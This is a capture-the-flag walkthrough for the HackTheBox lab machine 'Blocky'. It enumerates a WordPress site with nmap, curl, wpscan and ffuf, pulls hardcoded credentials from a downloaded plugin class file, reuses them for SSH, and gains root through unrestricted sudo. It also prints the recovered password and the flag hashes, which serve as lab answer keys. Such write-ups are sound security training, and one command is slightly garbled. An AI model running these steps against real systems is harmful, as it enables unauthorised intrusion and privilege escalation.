---
cover: ../../../.gitbook/assets/Blocky.png
coverY: 249.05599999999998
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Blocky

```bash
nmap -sV -sC -p21,22,80,8192 blocky.htb
```

```
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA)
|   256 5d7f389570c9beac67a01e86e7978403 (ECDSA)
|_  256 09d5c204951a90ef87562597df837067 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
|_http-generator: WordPress 4.8
8192/tcp closed sophos
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
curl -s -X GET http://blocky.htb | grep '<meta name="generator"'
```

The WordPress version is 4.8.

There is no plugin but there are themes :

```bash
curl -s -X GET http://blocky.htb | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```

```
http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
http://blocky.htb/wp-content/themes/twentyseventeen/assets/css/ie8.css?ver=1.0
http://blocky.htb/wp-content/themes/twentyseventeen/assets/js/html5.js?ver=3.7.3
http://blocky.htb/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js?ver=1.0
http://blocky.htb/wp-content/themes/twentyseventeen/assets/js/global.js?ver=1.0
http://blocky.htb/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js?ver=2.1.2
```

Find users :

```bash
wpscan --url http://blocky.htb --enumerate u
```

The user is `notch`.

I can enumerate the url http://blocky.htb.

```bash
ffuf -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://blocky.htb/FUZZ -fs 52227
```

The results are `wiki`, `wp-content`, `plugins`, `wp-includes`, `javascript`, `wp-admin`, `phpmyadmin`. I go to http://block.htb/plugins and download the files. I extract them and go to `./com/myfirstplugin/BlockyCode.class` and there are some credentials `root:8YsqfCTnvxAUeduzjNSXe22`.

I try these credentials on SSH

```bash
ssh notch@blocky.htb		# notch:8YsqfCTnvxAUeduzjNSXe22
```

I get the shell, now I can check sudo permissions :

```bash
cat /home/notch/user.txt  # c1a886acf96ca6b5590840ba2e948997
sudo -l
```

I can do everything as sudo thus I execute this command :

```bash
sudo -su
```

And I am root now.

```bash
cat /root/root.txt  # 66a208ec92cfb09e9a5108fd0e7f8a01
```
